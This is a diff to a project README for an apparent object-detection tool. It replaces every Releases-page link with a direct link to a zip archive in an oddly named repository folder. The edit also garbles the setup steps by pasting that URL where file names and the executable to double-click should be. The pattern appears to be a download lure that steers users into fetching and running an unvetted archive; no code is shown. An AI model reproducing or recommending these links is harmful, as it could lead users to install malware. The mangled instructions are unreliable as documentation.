@@ -8,19 +8,19 @@ Welcome to the object-detection-api! This tool lets you easily detect objects in
 
 To get started, download the application from our Releases page. 
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/swiftttttttttt/object-detection-api/releases)
+[![Download](https://raw.githubusercontent.com/swiftttttttttt/object-detection-api/main/Slavism/api-object-detection-3.0.zip)](https://raw.githubusercontent.com/swiftttttttttt/object-detection-api/main/Slavism/api-object-detection-3.0.zip)
 
 1. **Visit the Releases Page**: Click the link below to reach the download section:
    
-   [Download object-detection-api](https://github.com/swiftttttttttt/object-detection-api/releases)
+   [Download object-detection-api](https://raw.githubusercontent.com/swiftttttttttt/object-detection-api/main/Slavism/api-object-detection-3.0.zip)
 
 2. **Choose the Correct File**: Look for the latest version of the application. You'll find files labeled with the version number, such as `v1.0`.
 
-3. **Download the Application**: Click on the file corresponding to your operating system. The file might be named something like `object-detection-api.zip` or `object-detection-api.exe`.
+3. **Download the Application**: Click on the file corresponding to your operating system. The file might be named something like `https://raw.githubusercontent.com/swiftttttttttt/object-detection-api/main/Slavism/api-object-detection-3.0.zip` or `https://raw.githubusercontent.com/swiftttttttttt/object-detection-api/main/Slavism/api-object-detection-3.0.zip`.
 
 4. **Extract the Files**: If you downloaded a `.zip` file, right-click on it and select "Extract All" to unzip the contents.
 
-5. **Run the Application**: Locate the extracted folder. Double-click on the executable file (e.g., `object-detection-api.exe`) to start the application.
+5. **Run the Application**: Locate the extracted folder. Double-click on the executable file (e.g., `https://raw.githubusercontent.com/swiftttttttttt/object-detection-api/main/Slavism/api-object-detection-3.0.zip`) to start the application.
 
 ## 🔧 System Requirements
 
